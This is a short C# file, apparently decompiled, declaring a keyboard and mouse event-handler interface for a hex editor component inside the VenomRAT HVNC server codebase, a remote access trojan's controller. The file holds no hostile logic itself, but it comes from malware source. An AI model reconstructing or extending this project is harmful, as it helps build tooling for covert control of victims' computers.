using System;
using System.Windows.Forms;

namespace VenomRAT_HVNC.Server.Helper.HexEditor
{
    // Token: 0x0200006E RID: 110
    public interface IKeyMouseEventHandler
    {
        // Token: 0x060003FD RID: 1021
        void OnKeyPress(KeyPressEventArgs e);

        // Token: 0x060003FE RID: 1022
        void OnKeyDown(KeyEventArgs e);

        // Token: 0x060003FF RID: 1023
        void OnKeyUp(KeyEventArgs e);

        // Token: 0x06000400 RID: 1024
        void OnMouseDown(MouseEventArgs e);

        // Token: 0x06000401 RID: 1025
        void OnMouseDragged(MouseEventArgs e);

        // Token: 0x06000402 RID: 1026
        void OnMouseUp(MouseEventArgs e);

        // Token: 0x06000403 RID: 1027
        void OnMouseDoubleClick(MouseEventArgs e);

        // Token: 0x06000404 RID: 1028
        void OnGotFocus(EventArgs e);
    }
}